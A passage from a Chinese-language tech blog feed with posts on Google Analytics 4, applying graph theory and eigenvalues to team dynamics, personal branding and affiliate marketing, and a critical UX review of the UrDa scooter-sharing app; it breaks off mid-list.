src="/2020/11/03/marketing-google-analytics-4-quick-start/GTMGADebug.png" alt="GTMGADebug"></p></blockquote><p>目前看起來有提供連結 Google Ads 還有 Big Query 可以進行後續操作。</p><p><img src="/2020/11/03/marketing-google-analytics-4-quick-start/LinkToGA4.JPG" alt="LinkToGA4"></p><p>新一代的 GA 整合了應用程式 + 網站資源，比較大的差異在拿掉了工作階段並換成用參與度的概念取代跳出，參與度是互動工作階段的百分比，用互動工作階段數除以工作階段數來計算。</p><blockquote><p>新 Dashboard vs 舊 Dashboard<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/GAvsNewGADashboard.png" alt="GAvsNewGADashboard"></p></blockquote><p>選單明顯也拿掉比較多的專有名詞，用更直觀的分類方式進行分類，舊版的看起來很像工程團隊目前有什麼功能就上什麼的概念，命名、分類、查詢的動向都比較不直觀，新版好上手非常多。</p><blockquote><p>新選單 vs 舊選單<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/GAvsNewGA.png" alt="GAvsNewGA"></p></blockquote><p>可是等等，難道只有參加過鐵人賽 Elastic Cloud 組的我覺得 Google Analytics 4 現在這樣完全不夠炫炮嗎? Elastic Cloud 炫技的部分，請參見 <a href="https://linyencheng.github.io/2020/10/01/elastic-kibana-infographic/">Elastic Kibana Infographic: 資訊圖像化可以炫技到什麼程度</a>，真的是很猛，直接上圖，希望 GA 也可以快步跟上 XDDD</p><blockquote><p>圖片來源: <a href="https://www.elastic.co/what-is/kibana-canvas">https://www.elastic.co/what-is/kibana-canvas</a><br><img src="https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltf084dd417f3f7807/5ca67af36f69e6812ec33a24/animated-gif-canvas-sql.gif" alt="InfrastructureMonitoring"></p></blockquote><blockquote><p>更客製化的商業報表<br><img src="https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte86a13ae6e0733c3/5ce2b0f1932da9737b262b85/screenshot-canvas-business-analytics.png" alt="BusinessAnalytics"></p></blockquote><h3 id="資料保留設定"><a href="#資料保留設定" class="headerlink" title="資料保留設定"></a>資料保留設定</h3><p>新版的 GA4 預設只將事件資料保留 2 個月，若需要延長需要自行到資料保留設定中設定，最多可以延長到 14 個月。</p><blockquote><p>資料保留設定<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/DataKeepDefaultDay.png" alt="DataKeepDefaultDay"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>圖論、線性代數、團隊關係</title>
      <link href="/2020/10/28/thinking-team-building-by-math/"/>
      <url>/2020/10/28/thinking-team-building-by-math/</url>
      
        <content type="html"><![CDATA[<p>前陣子小編參加讀書會，不小心看到了連通圖跟特徵向量，馬上想起了小時候周老上的數學，但卻回憶不了過去特徵值、特徵向量的物理意義，於是乎，這篇心得不就來了嗎!!!這篇文章會帶著大家一起從圖論、線性轉換、收斂系統的角度來看團隊關係。</p><h2 id="收斂系統"><a href="#收斂系統" class="headerlink" title="收斂系統"></a>收斂系統</h2><p>在公司或職場中，工作技能的供給和需求兩個變數可以看成是一個線性且收斂的系統，前天晚上問了一下家小孩，宅條舉例通常三維以下的關係會是能夠收斂的，以草原上的獅子跟牛為例來說明。</p><p>首先假設一個 Control Volume 且在固定條件下的 Property 都是穩定的，也就是草原中草的溫度、濕度、草的生長速度都是穩定的，獅子跟牛是屬於吃與被吃的關係，最終獅子和牛會收斂在某種平衡。</p><p>如果因為獅子開聯誼派對導致下波出生的獅子較多，接下來牛被吃的量也會變多，當食物變少了獅子自然死亡的比例則會提高，每天的回合就像是個轉換矩陣，讓數量變化形成某種無限循環，然而獅子和牛的數量取決於:</p><ul><li>獅子的掠食</li><li>獅子的自然死亡</li><li>牛的自然死亡</li><li>牛的出生速度</li></ul><blockquote><p>什麼是 Property? 在 Control Volume 中達到 Homogeneous 情況的 Steady State</p></blockquote><p>來看看為什麼有些公司常常擴編了之後又裁員，當 Control Volume 中的 Property 都沒有進行改變時，像是高層的價值觀、公司的業務量等等都沒太大改變的情況下，工作技能的需求與供給就會像是獅子和牛一樣。以一個這樣的系統來說，特徵值就像是 Control Volume 的本質組成，會影響整個系統收斂的速度。</p><p>同理，為什麼團隊成員越多效率反而並不一定會提升，雖然總體獵捕的速度是加快的，但牛的數量有時候並沒有隨著一起變多，反而造成了團隊的總獵捕量的下降，這可能也是為什麼 Scrum Team 要維持在比較小的編制，除了溝通成本外，或許是為了讓收斂速度變快且更好預測吧?</p><h2 id="線性轉換"><a href="#線性轉換" class="headerlink" title="線性轉換"></a>線性轉換</h2><p>為什麼要進行轉換，通常就是在原來的觀察的時間或空間下並沒有那麼好觀察，像是把一般矩陣或是對稱矩陣做對角化，或是把三維降成二維，簡單來說棒球投出後的軌跡雖然是發生在三維世界，但實際上可以透過二維的平面進行描述，也就是大家國高中念的物理。</p><p>線性轉換，就是把線性的系統看成函數，探討在不同向量空間裡面向量的對應情形，轉換過後空間雖然扭曲改變了，向量與向量之間的關係並沒有改變，平行的還是平行，垂直的還是垂直。就像在自動控制系統中，我們也很常把時域轉換成頻域來進行觀察。</p><p>用數學的名詞來看就是在向量空間中透過轉換矩陣，進行向量、座標之間的轉換 <code>AX = b</code>，A 是轉換矩陣，幫我們把 X 轉換成 b，其中 X 是定義域，b 是經過線性轉換後的值域。</p><table><thead><tr><th>A</th><th>X</th><th>b</th></tr></thead><tbody><tr><td>2,3,1 <br> 4,1,-3</td><td>x<br>y<br>z<br></td><td>7<br>9<br></td></tr></tbody></table><p>其實轉換和降維的想法我覺得蠻重要的，在遇到問題的時候，常常大家都說<del>對人不對事</del> (更正是對事不對人)，反正遇到問題就先推卸責任說是其他 Team 的問題就對了，然而這種方式很可能會把自己養成廢物，但無腦的幫忙救火擦屁股也可能變成能者多勞 QQ</p><p>那公司的文化是否能提倡透過轉換和降維把人的因素去掉，去想一下這個問題怎麼避免和改善或許對團隊才是最重要的。當發生問題的時候，先不要想是人的問題，所以去掉這個維度之後，剩下的通常就是流程面、技術面的防呆，我個人是認為好的上 Code 流程以及一定程度的自動化導入完全可以大量降低出包風險。</p><p>討論需求的時候，PM 或是老闆的概念往往都是多維度的一個想像結果，身為<del>不想加班且加班不能的</del>工程師就必須協助把維度下降，降成一個最小可行性的解決方案，在最短的時間做持續的交付，讓專案用每天向終點爬一點的方式慢慢前進，而不是光討論和設計就花了兩週以上然後叫工程師要在三周內衝完全部，這種比例跟專案進行方式明顯會增加工程師的疲累感和出包機率。</p><h2 id="特徵值與特徵向量"><a href="#特徵值與特徵向量" class="headerlink" title="特徵值與特徵向量"></a>特徵值與特徵向量</h2><p>特徵向量是經過線性轉換 (旋轉、拉伸) 而不改變方向的一個向量，滿足條件的向量可以用 <code>A(x) = λx</code> 來表示。</p><blockquote><p>特徵值與特徵向量 (<a href="https://pic1.zhimg.com/v2-8ad6a95ca5093d9cea74ba2d3c9438a4_b.webp">圖片來源</a>)<br><img src="https://pic1.zhimg.com/v2-8ad6a95ca5093d9cea74ba2d3c9438a4_b.webp" alt="EigenvaluesAndEigenvector"></p></blockquote><p>那 λ 就會出現以下三種情境，理工科的大大們一定不只有點熟悉，在阻尼系統中就代表欠阻尼(Underdamping)、臨界阻尼(Critically damped)、過阻尼(Overdamping)，但只是跟係數相關，正確算法可能要<a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E5%B0%BC">參考這裡</a>XDDD</p><ul><li>λ &lt; 1</li><li>λ &#x3D; 1</li><li>λ &gt; 1</li></ul><blockquote><p>阻尼係數 (<a href="https://zh.wikipedia.org/zh-tw/%E9%98%BB%E5%B0%BC">圖片來源</a>)<br><img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Damping_types.PNG" alt="damping"></p></blockquote><p>小時候我們學過的撿鞋運動 <code>f(x) = -kx</code> 就是類似這樣的公式，從物理學可以知道加速度跟時間的關係是軌跡方程式微分兩次，如果用成人の數學去解出 <code>x(t)</code> 就會發現是 <code>cos</code> 和 <code>sin</code> 的組合函數。</p><p>Wiki: <a href="https://zh.wikipedia.org/zh-tw/%E5%B8%B8%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B">https://zh.wikipedia.org/zh-tw/%E5%B8%B8%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B</a></p><p>實際上舉個經典例子來看，被震斷的橋梁就是系統中的幾個部分被鎖死的阻尼系統。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/j-zczJXSxnw?controls=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>會造成震動的原因是風力在原來穩定的流體中，被放了一個障礙物，在滿足某些條件下 (印象中是不滑動條件)，流體會出現邊界層的流動分離，接著分離的流體就會出現高低壓差，產生渦旋，在障礙物的兩側會產生規律的反向渦旋，就是 Kármán vortex，就是這個穩定頻率的壓差變化讓橋倒塌 (影片 50 秒左右)。</p><p>Wiki: <a href="https://zh.wikipedia.org/zh-tw/%E5%8D%A1%E9%97%A8%E6%B6%A1%E8%A1%97">https://zh.wikipedia.org/zh-tw/%E5%8D%A1%E9%97%A8%E6%B6%A1%E8%A1%97</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/IDeGDFZSYo8?controls=0&amp;start=60" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>如果大家好奇，台南美術館二館觀景台上的欄杆都只有做單一維度的支撐，大家下次有到台南玩可以用小小力量還有特定頻率去輕輕的推，推久了就會發現晃動越來越大，然後就不要再推了因為會壞掉 XDDD</p><p>就跟盪鞦韆的道理一樣，找出適合那個人體重晃動的基頻，而特徵值在這裡其實就會跟自然振動頻率相關，其中最小的那個就是基頻，在音樂裡面泛音頻率就正好是基頻的整數倍，通常在譜曲時會用頻率上的整數比來讓整體音樂和諧，可以參考<a href="https://scitechvista.nat.gov.tw/c/s2lI.htm">基頻與泛音</a>。</p><p>在團隊關係中，要怎麼讓開會時不要一直發散也不要太快結束呢? 我到最近幾年漸漸都在推廣大家在開會前先寫好會議記錄，在還沒開始開會前就直接寫上想像中的結果上去，沒有結果就提出問題的分析以及需要的協助，調整撰寫會議紀錄時間就是一個調整參數的概念 XD</p><h2 id="圖論"><a href="#圖論" class="headerlink" title="圖論"></a>圖論</h2><p>在 50 人以下的新創公司裡，我的經驗是每個人做的事情都非常透明，只要你想看的話幾乎都知道每個人現在在做什麼，即便想藏也藏不起來，但場景只要一變成 50 人的中小企業，要了解其他部門往往就變成需要主管來進行同步，等到變成 300 人上櫃公司之後，我發現，竟然變成需要靠內部八卦跟小道消息了…</p><blockquote><p>這時候就會讓人好奇，為什麼公司會越來越走向資訊不對稱這條路?</p></blockquote><p>其實顯然就是有人在溝通網路裡面在操作這樣的事情，在圖論中有種圖的定義是連通圖，定義是對於所有點對之間都至少有一條路徑可以相通。在組織中可以看成訊息的溝通網路，如果加上限制就會變成有向圖，舉例來說就像是商朝末年，紂王耳朵只會透過妲己的嘴巴吸收訊息，最終結果是微子去之，箕子為之奴，比干諫而死。</p><p>在圖論和網絡分析中，中心性 (Centrality) 是判斷網絡中節點重要性或影響力的指標，無能力者絕對要努力在組織中成為連通圖的中心，雖然容易讓訊息的流通遇到瓶頸，但如果想要搞政治穩固自己的位置絕對是不二選擇。</p><p>在建立團隊的時候，為了降低溝通成本，就可以用最小生成樹的概念，讓訊息可以無痛的在節點中建立連接，最小生成樹是連通加權無向圖中一棵權值最小的生成樹，並告訴團隊成員，怎麼用最短的路徑通知到該通知的節點，不管是透過 Trello、Jira、Slack 的 <a href="https://standupalice.com/">Stand up Alice</a> 我覺得都是不錯的工具。</p><p>另外如果一個有向圖中的每一個頂點對於其他的每個節點都存在著一條路徑能夠到達，可以稱該有向圖強連通，而強連通元件的性質是可以把整個強連通元件視作一個點，如果將每一個強連通元件縮成一個點，則原圖會變成一張有向無環圖。</p><p>強連通的這個部分，個人覺得這個資訊高速流通有點像是網路業中的 Scrum Team。</p><h2 id="中心性"><a href="#中心性" class="headerlink" title="中心性"></a>中心性</h2><ul><li>Degree Centrality: 重要的節點就是擁有許多連接的節點，連接關係越多，影響力就越強，助理是大家的，非常重要</li><li>Closeness Centrality: 接近中心性，該節點與圖中所有其他節點之間的最短路徑長度之和的倒數，東廠第一把交椅</li><li>Betweenness Centrality: 中介中心性，圖中任兩節點均至少存在一個最短路徑，中介中心性即為這些最短路徑穿過該節點的次數，好人一生平安，上廁所都有衛生紙，有點像是超強 PM 或是 Scrum Master</li><li>Eigenvector Centrality: 特徵向量中心性，是測量節點對網絡影響的一種方式，得分較高意味著該節點與許多自身得分較高的節點相連接，婆婆媽媽們の八卦領袖</li></ul><h2 id="網路流"><a href="#網路流" class="headerlink" title="網路流"></a>網路流</h2><p>在 Network Flow and Maximum Flow Minimum Cut Theorem 裡面，還加上了流量的概念，中心這時候就不一定重要，因為會存在資訊流量限制，可以想像成助理雖然是大家的樞紐中心，但權責上僅能處理小問題。</p><p>假設水管系統水從入口流入，經過互相連結、孔徑不一的水管後從出水口流出。但目標是一次流入最大量的水。若先流過一條半徑只有 2 公分的水管，則接在其後的水管的半徑即使再大，水流量仍會被半徑 2 公分的水管所限制，因此整體流量也就受限制。</p><p>個人認為團隊中要找到資訊流的瓶頸，通常就是先看一下樞紐中心是不是在搞資訊不對稱，如果發現是東廠第一把交椅，可能也只能想辦法另外打通一條資訊的連通網路 QQ</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四個網路發展對個人品牌影響</title>
      <link href="/2020/10/24/thinking-personal-brand/"/>
      <url>/2020/10/24/thinking-personal-brand/</url>
      
        <content type="html"><![CDATA[<h2 id="四個網路發展對個人品牌影響"><a href="#四個網路發展對個人品牌影響" class="headerlink" title="四個網路發展對個人品牌影響"></a>四個網路發展對個人品牌影響</h2><p>這篇文章會分享在我寫部落格三年後到了台北，參加了各式讀書會接觸到開源社群、知識變現、聯盟行銷後的各種理解、成長與想像。</p><p>為什麼網路時代底下個人品牌開始變得重要? 在網路影響下，非常多的事情開始高速發展，有很多東西出現也有很多東西消失，我今年 31 歲，第一次開始學電腦是小學從 Dos 開始，可以說是從小完整見證網路業的快速發展，從小到大看著</p><ul><li>系統: Dos → Windows</li><li>儲存: MB → GB → TB</li><li>網路: 撥接 → 寬頻 → 光纖 → 5G</li><li>手機: 智障型 → 功能型 → 智慧型</li><li>通訊: 即時通 → MSN → FB → Line → TG</li><li>生活: 無名 → 痞客邦 → FB → IG → YT</li></ul><p>變化的不只實際上的物品也包含職缺，這幾年出現的新興職缺包含專職的前端工程師、雲端技術工程師、App 工程師、巨量資料分析師、YouTuber、社群經理都是十幾年前不會常在人力銀行出現的。</p><p>在網路時代下，人生首抽普通的我，認為值得思考的事情是</p><ul><li>當把公司的加持拿掉之後，我們還剩下什麼?</li><li>有什麼職場上的能力是我們能夠一直帶在身上是跟個人相關而跟公司無關的?</li><li>對公司、或是這個社會而言，我們的可利用價值在哪裏?</li><li>離開公司後，要用什麼去跟企業、社會去談我們跟其他人不同的價值在哪裏?</li></ul><blockquote><p>2020 除了武漢肺炎全球確診超過 4000 萬以外、韓國瑜出來競選總統後被罷免，接下來的社會還會有什麼樣劇烈的變化? 我們又該如何應對?</p></blockquote><p>前幾年我選擇快速發展的前端做為職涯發展，工作算是很少盡全力的我，五年後薪水比起一開始多了 50% 以上，所以我認為在薪水發展上需要的是找到我們可以用力且成效好的地方，觀察網路的發展影響了什麼這就是一個例子，至於成功的 YouTuber 們就更不用多談了。</p><h3 id="容易經營個人品牌"><a href="#容易經營個人品牌" class="headerlink" title="容易經營個人品牌"></a>容易經營個人品牌</h3><p>到了台北之後，發現最大的差異除了在男孩子普遍很會喇年輕妹不只一點外，讀書會是真的多很多也比較容易遇到在職涯上想要積極進取的大家，而且超容易看到那些網路上的各位大大本人，前陣子剛好參加過何則文出新書的讀書會，底下列出一些聽到比較覺得可以分享的:</p><ul><li>別讓世界定義你: 課表只決定你要上什麼課，並沒有決定你要成為什麼樣的人</li><li>定位自己: 「如果你不知道你要去哪裡， 那麼現在你在哪裡一點都不重要。」 Lewis Carroll《愛麗絲夢遊仙境》<ul><li>知道終點，知道努力方向，爬也會爬到，時間早晚</li><li>多重人生，在不同的階段可能會有不同的終點出現</li></ul></li><li>網路的速度加速了哪些地方?<ul><li>斜槓，透過網路放大個人影響力</li><li>平台經濟，許多行業也都透過網路平台來放大銷售</li></ul></li><li>增加人生頻寬<ul><li>因為時間金錢不足，而耗費多餘的精力在有限的人生頻寬上</li><li>成為別人的貴人，幫助別人的同時自己往往也成長了</li></ul></li></ul><p>在個人定位上，要記得隨時盤點自己的技能，職業其實也跟科系一樣，只決定我們上班八小時大部分時間該做什麼，也是因為參加活動後發現現在的小孩子各個都非常善於經營社群，驚覺網路已經發展到了一個只要用心就會有用力的地方，已經是一個一直吃東西一直爬山都可以變成小網紅接業配的年代。</p><blockquote><p>那，讚跟點閱代表了什麼? 個人品牌和社群經營對我們而言又有什麼意義?</p></blockquote><p>開始寫部落格之後，最顯著的大概就是會有很多 LinkedIn 照片很漂亮的女孩子加我，少說加了 50+ 個有吧 XDDD 男孩子如果邀請訊息亂打我都直接已讀懶得回，雖然知道就是業務性質的人力仲介，但以職涯發展為主的交友軟體來說，成效算是不錯?</p><p>另外一個好處是面試的時候，寫過的主題通常不太會被再問，之前同事有在面試的時候直接跟隔壁同事說，人家有寫過了你還問，瞬間不用浪費時間，覺得很有趣。</p><p>然後極少數在自我介紹有時候會遇到同行說，我知道你!!!我有看過你寫的文章，原來是你，好酷!!! 不過被宅宅認識我個人是沒有太大的愉悅啦 XDDD</p><h3 id="經營社群"><a href="#經營社群" class="headerlink" title="經營社群"></a>經營社群</h3><p>軟體業來說，開源社群發展非常蓬勃，目前前端大家最常用的函式庫包含 <code>react.js</code>、<code>vue.js</code>、<code>angular</code> 都是開放原始碼的，想看任何內容文件都可以看到，甚至能力夠的話也可以參與開發。</p><p>在開源的社群裡，我可以大膽地說出，你想過的問題開源社群都曾經實作過一套解決方法，在台北的話軟體開發的社群也有非常多，這邊就簡單列一些些前端工程師平常會看的社團:</p><ul><li><a href="https://www.facebook.com/groups/reactjs.tw">https://www.facebook.com/groups/reactjs.tw</a></li><li><a href="https://www.facebook.com/groups/f2e.tw">https://www.facebook.com/groups/f2e.tw</a></li><li><a href="https://www.facebook.com/groups/vuejs.tw">https://www.facebook.com/groups/vuejs.tw</a></li><li><a href="https://www.facebook.com/groups/augularjs.tw">https://www.facebook.com/groups/augularjs.tw</a></li><li><a href="https://www.facebook.com/groups/wordpresstw">https://www.facebook.com/groups/wordpresstw</a></li><li><a href="https://www.facebook.com/groups/GitLabTaipei">https://www.facebook.com/groups/GitLabTaipei</a></li><li><a href="https://www.facebook.com/groups/docker.taipei">https://www.facebook.com/groups/docker.taipei</a></li><li><a href="https://www.facebook.com/groups/chatbot.tw">https://www.facebook.com/groups/chatbot.tw</a></li><li><a href="https://www.facebook.com/groups/uxsupportgroup">https://www.facebook.com/groups/uxsupportgroup</a></li><li><a href="https://github.com/f2etw/jobs/issues">https://github.com/f2etw/jobs/issues</a></li></ul><p>舉個例子來說，前陣子因為發現小朋友都有做一個行銷自己的自我介紹頁面，我覺得很棒!!! 那在個人頁面的設計上，像是 Linktree、taplink 都是不錯服務，其實目的很簡單就是解決 Instagram 一次只能放一個網址的問題。</p><p>有能力寫網頁的話當然也可以自己做個炫砲的 RWD，但下班後就省電模式如我是直接使用開源版本的 LinkFree 來進行修改，並架設在 Github 上，我 Fork 出來的 Repo 在此，有稍微修改也埋了 GA:</p><p><a href="https://github.com/LinYenCheng/LinkFree">https://github.com/LinYenCheng/LinkFree</a></p><p>最終的頁面在此:</p><p><a href="https://linyencheng.github.io/LinkFree/">https://linyencheng.github.io/LinkFree/</a></p><p>開源的好處還有在面試的時候，負責面試的人可以直接看專案就能夠對能力略知一二，可以再次減少了面試的時間，以小編前陣子為了行銷武漢肺炎這個名詞做的網站來說，看這個專案的人就知道這個人會的技能可能有:</p><ul><li>基本切版、動畫、RWD</li><li>不使用前端函式庫或框架寫網頁</li><li>會使用 npm</li><li>會使用 Github</li><li>有整理 CHANGELOG</li><li>整合武漢肺炎開源資料</li><li>實作地理資訊系統</li><li>打包前端程式</li><li>CI&#x2F;CD (Github Action)</li></ul><p>Repo 在此:</p><p><a href="https://github.com/LinYenCheng/virus-and-where-to-find-them">https://github.com/LinYenCheng/virus-and-where-to-find-them</a></p><p>最終的頁面在此:</p><p><a href="https://linyencheng.github.io/virus-and-where-to-find-them/">https://linyencheng.github.io/virus-and-where-to-find-them/</a></p><h3 id="知識變現"><a href="#知識變現" class="headerlink" title="知識變現"></a>知識變現</h3><p>對參加過為數不少開源社群活動的我來說，個人的價值觀認為如果要加速世界的進步，提供訂閱服務收費沒太大問題，但知識本身真的並不應該被商品化，現在請大家想像一下在上學可以選課的時候，你的教授在系館門口排一排喊著工數 + 流力兩件 79 折，限時加購計概、資結每堂 1888 要買要快? 難道? 不會覺得這簡直太可笑，而且還會懷疑那個老師腦子是不是出了點問題，對吧 XDDD</p><p>反過來說當知識開始被變現之後，想的很大可能就並不完全是傳道、授業、解惑，而是要怎麼從受眾身上持續的拿到錢了，對吧?! 畢竟會參加知識變現的商業模式，說穿了不就是想要賺錢一波? 不然就參加開源社群大家共好就好了不是嗎? 就是不想要免費共好想要也可以順便賺錢嘛 XDDD</p><blockquote><p>乾貨沒有不好，但我們不要忘記思考的能力</p></blockquote><p>阿雅曾經在某次直播這麼說過，當下就覺得不要再偷懶了 XDDD 常被餵養整理、篩選過的資訊，有沒有想過究竟是誰? 為什麼寫這個內容? 這個內容是怎麼來的? 偏偏要在這個時候? 為什麼選擇在這樣的平台把訊息餵養給正在看訊息的我們?</p><blockquote><p>最終到底是加速知識傳播，還是現金流的傳播?</p></blockquote><p>當然每個人的價值觀不同，想要賺錢的方式不同，沒有什麼好壞對錯，但我個人認為，要賺錢就要賺有錢人的錢而且直接賺爆，像是去當家教、接案，每位學生時薪直接收個 1000~2000，甚至談家教月薪，有錢人我認為完全付得起，弱弱相殘真的沒有比較好 QQ</p><p>這也是我目前很佩服矽谷阿雅、何則文、小金魚大大的地方，願意用不那麼弱弱相殘的方式，持續的把有用的知識傳播給大家，接下來就讓我們繼續看一下常見的知識變現方式<code>聯盟行銷</code>，坦白說，我第一次看到介紹還以為是要賣淨水器呢 Orz</p><h3 id="聯盟行銷"><a href="#聯盟行銷" class="headerlink" title="聯盟行銷"></a>聯盟行銷</h3><p>不知道你各位在很多社團、粉專、群組、網誌 484 常常看到一個人寫了一堆看起來好像很有幫助的話之後，最後會附上一句話，如果對 **__ 有興趣，我最近 __**，歡迎你各位<del>韭菜們</del>!!!</p><p><code>付費購買連結在此XDDD</code></p><blockquote><p>隱藏規則: 分享者可獲得，點擊一次 0.01 元、一次下載試用 10 元、購買分潤 87% (這亂掰的 XD)</p></blockquote><p>以上就是透過案例來說明聯盟行銷，可以看得出來其實就是不用囤貨的直銷，透過分潤的機制來讓上下游都賺錢的一個模式，藉由一個拉一個的效果，透過組織的滲透來擴散影響力，厲害吧 XDDD 所以名字雖然是聯盟行銷，實際上就是網路商品的直銷，由於網路的商品，自然就不會有庫存的問題囉，讚!</p><p>簡單來說如果把知識或訊息分成生產者、收成者、消費者，那些做聯盟行銷的普遍看起來會比較像是收成者，當然也是有可能自己生產自己收割。因為常常會需要大量的產出整理過後的訊息，可以說是不事生產但從事包裝、代銷的工作。</p><blockquote><p>其實人生很短，重要的事情是什麼?</p></blockquote><p>坦白說在還有能力動腦的現在，會希望自己還是有點能力當生產者，畢竟知識才是所有一切發展的根基，大家也都知道如果 3 公里跑不進 6 分速就去挑戰 42 公里，受傷的機率會很高。</p><p>同理網路世界中的個人品牌我想也是，畢竟知識層面上的草包並不會因為經營個人品牌、跑社群、做聯盟行銷而改善，在專業知識累積這方面我深信跟練馬拉松一樣只有累積沒有奇蹟，共勉之。</p>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三個騎 UrDa 前就爛到不行的體驗</title>
      <link href="/2020/10/19/thinking-urda-app-user-experience/"/>
      <url>/2020/10/19/thinking-urda-app-user-experience/</url>
      
        <content type="html"><![CDATA[<h2 id="三個騎-UrDa-前就爛到不行的體驗"><a href="#三個騎-UrDa-前就爛到不行的體驗" class="headerlink" title="三個騎 UrDa 前就爛到不行的體驗"></a>三個騎 UrDa 前就爛到不行的體驗</h2><p>前陣子跟了一波報復性出遊，終於到澎湖看了心心念念快十年的花火節，當年大學歡樂畢旅腦筋轉不過來想不開，竟然傻呼呼的去杭州實習而沒有參加畢旅，事後想想還真有點遺憾，不過反正都是一群男孩子出去玩好像也不用太難過吧?(嗎?!!)XDDD</p><p>這次體驗文本來是打算寫一篇文靠北加翻白眼到外太空的，但想想身為一個專業的?前端攻城獅，還是來想想這整個流程到底出了什麼問題，可以改善什麼? 接下來會從零開始，從整個體驗流程來看看 UrDa 還有哪些可以改善的地方。</p><h3 id="註冊畫面"><a href="#註冊畫面" class="headerlink" title="註冊畫面"></a>註冊畫面</h3><p>上班族平常生活應該還蠻充實的，上班如果運氣好通常都會很容易進到 Zone 裡面工作，坦白說，其實蠻耗損精神力的，通常下班就會直接進入省電模式，所以一把年紀之後通常? 也開始習慣出去玩不排行程，只求到當地可以找到交通工具。(明明是獨立事件?XDDD)</p><p>因為每天都有一萬人降落澎湖馬公，機車已經不太好租，所以決定來試看看共享機車的服務，出發前兩天的晚上，邊電話討論相關事情，一邊嘗試註冊，結果我試了十幾分鐘都一直失敗，還刪掉 APP 重來兩次，直接在電話先靠北兩句:</p><blockquote><p>連前端工程師都沒辦法三分鐘內註冊成功，到底有幾個人可以?</p></blockquote><p>來看一下我失敗的原因，APP 的畫面裡面底下有兩顆社群的按鈕，以我過去實作的經驗來說，這個就是註冊兼登入用的按鈕，等到第一次進入介面使用到關鍵流程時，才需要補齊相關資料，但竟然沒辦法快速登入，過程中失敗了也沒有任何提示。</p><blockquote><p>容易讓工程師誤解的介面，社群按鈕有時候會兼註冊 &amp;&amp; 登入<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaLogin.jpg" alt="UrdaLogin"></p></blockquote><p>為什麼會想要只先使用快速登入，因為我點了一般註冊，發現想要進去試用介面、查看站點等功能就要填一堆個資 (包含登錄信用卡)，又是一家看起來老闆只想賺錢但沒錢請工程師，介面寫的不怎麼樣且沒聽過的公司，覺得有點危險。</p><ul><li>只想體驗介面操作評估工程團隊能力</li><li>想了解是否有足夠的機車可租</li></ul><blockquote><p>這個必填真的超多<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaRegister.jpg" alt="UrdaRegister"></p></blockquote><p>我會建議拿掉非必要只是為了行銷的資料，還有為什麼要一開始就填信用卡，超怕被盜刷，然後社群按鈕請補上未綁定不能使用的警語出現，這個我小時候就做過，前兩年也做過一次完全不難，工程師請認真一點。</p><h3 id="網站體驗"><a href="#網站體驗" class="headerlink" title="網站體驗"></a>網站體驗</h3><p>試了第三次之後，決定放棄直接用網頁介面 Orz 我後來是用網頁介面註冊成功，才知道是要先註冊後才能綁定社群帳號，網頁看起來還是外包的，曠 X 國 X 有限公司負責的，看起來整個公司是沒錢請工程師的概念 QQ 不過不愧是外包的，使用起來沒有太大問題，唯一覺得怪怪還可以再進步的就是:</p><ul><li>Header 選單，Hover 的效果好像沒有對齊，寬度也不一致</li><li>Banner 圖片品質太高 2.5MB 覺得只是 Banner 不是寫真集應該沒這個必要?</li><li>另外一張說明直接上圖很偷懶 1.3MB，無障礙網頁來說這樣真的母湯?</li></ul><p>SEO 光是把網站速度提升就可以多不知道多少流量了，這麼簡單的改善，不做嗎? TinyPng 讓無損壓縮變很簡單，用一下，好嗎 XDDD 喔靠，差點忘記這間公司可能沒錢請工程師了 QQ 網站雖然第二次之後就會快取，App 部份我不熟看起來好像不會，還是建議一下圖片剛好就好。</p><blockquote><p>過大的圖片<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaSite.JPG" alt="UrdaSite"></p></blockquote><h3 id="App-使用體驗"><a href="#App-使用體驗" class="headerlink" title="App 使用體驗"></a>App 使用體驗</h3><p>打開 APP 系統後接的地圖有兩種，一看就還在改版，然後手滑上錯了吧?</p><ul><li>OSM: 要套就支持開源一次全套，前端函式庫有 leaflet、Openlayers 使用上都很簡單，不會寫 APP 可以用 WebView 啊</li><li>Google Map (竟然還是 develop mode): 沒錢請工程師至少也要花錢啟用服務吧，Google 地圖蠻便宜的阿 QQ</li></ul><blockquote><p>令人傻眼的 Develop Mode<br><img src="/2020/10/19/thinking-urda-app-user-experience/MapDevelopeMode.jpg" alt="MapDevelopeMode"></p></blockquote><p>上次真的有在學怎麼寫 App 已經是大學跟研究所了，所以只能列一些體驗上覺得可以進步的地方:</p><ul><li>註冊的表單格子有夠小<ul><li>直接附上<a href="https://material.io/design/usability/accessibility.html#layout-and-typography">設計相關建議</a></li></ul></li><li>APP 